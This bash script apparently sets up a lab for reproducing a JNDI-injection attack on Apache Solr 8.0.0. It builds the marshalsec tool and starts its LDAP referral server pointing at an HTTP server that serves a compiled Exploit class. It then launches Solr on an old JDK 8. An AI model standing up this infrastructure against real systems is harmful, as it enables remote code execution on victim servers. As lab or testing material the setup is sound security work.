#!/usr/bin/env bash

GREEN='\033[0;32m'
LIGHT_GRAY='\033[0;37m'
DARK_GRAY='\033[0;30m'
NC='\033[0m' # No Color

echo -e  "${GREEN}[+]${LIGHT_GRAY}Update........${DARK_GRAY}";
sudo apt update;

if [ $(dpkg-query -W -f='${Status}' wget 2>/dev/null | grep -c "ok installed") -eq 0 ];
then
	echo -e "Installing wget";
	sudo apt install -y wget;
else
	echo "Installed wget";
fi

if [ $(dpkg-query -W -f='${Status}' git 2>/dev/null | grep -c "ok installed") -eq 0 ];
then
	echo "Installing git"
	sudo apt install -y git;
else 	
	echo "Installed git";
fi

if [ $(dpkg-query -W -f='${Status}' maven 2>/dev/null | grep -c "ok installed") -eq 0 ];
then
	echo "Installing maven";
	sudo apt install -y maven;
else
	echo "Installed maven";
fi 

if [ $(dpkg-query -W -f='${Status}' tmux 2>/dev/null | grep -c "ok installed") -eq 0 ];
then
	echo "Install tmux";
	sudo apt install -y tmux;
else	
	echo "Installed tmux";
fi 

SCRIPTPATH=$(pwd);


if [ ! -f "jdk-8u181-linux-x64.tar.gz" ]; then
	echo "Download jdk-8u181";
	wget https://repo.huaweicloud.com/java/jdk/8u181-b13/jdk-8u181-linux-x64.tar.gz;
fi

if [ ! -d /opt/jdk ]; then
	sudo mkdir -p /opt/jdk;
	sudo tar zxf jdk-8u181-linux-x64.tar.gz -C /opt/jdk;
fi


echo "Clone marshalsec";
git clone https://github.com/mbechler/marshalsec.git;

export JAVA_HOME=/opt/jdk/jdk1.8.0_181;
cd marshalsec;
mvn clean package -DskipTests;
cp target/marshalsec-0.0.3-SNAPSHOT-all.jar ./;
cd $SCRIPTPATH;


if [ ! -f "solr-8.0.0.tgz" ]; then
	echo "Download Solr";
	wget https://archive.apache.org/dist/lucene/solr/8.0.0/solr-8.0.0.tgz;
fi

if [ ! -d ./solr-8.0.0 ]; then
	tar zxf solr-8.0.0.tgz;
fi

#mkdir -p ~/.tmux/tmp;
if [ ! -d /tmp/tmux-0/default ]; then
	mkdir -p /tmp/tmux-0/default;
fi
#export TMUX_TMPDIR=~/.tmux/tmp;
if ! tmux ls |grep "marshalsec";
then
	echo "running LDAP_Server";
	tmux new -s marshalsec -d '/opt/jdk/jdk1.8.0_181/bin/java -cp marshalsec/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://HTTP_Server-IP:8888/#Exploit';
else
	echo "LDAP_Server is already executing";
fi 

cd class-server
/opt/jdk/jdk1.8.0_181/bin/javac Exploit.java -source 8 -target 8;
if ! tmux ls | grep "http";
then
	echo "running Http_Server";
	tmux new -s http -d 'python3 -m http.server 8888';
else
	echo "Http_Server is already executing";
fi

cd $SCRIPTPATH;

sed -i 's/#SOLR_JAVA_HOME=.*/SOLR_JAVA_HOME="\/opt\/jdk\/jdk1.8.0_181"/g' solr-8.0.0/bin/solr.in.sh

solr-8.0.0/bin/solr start -force;









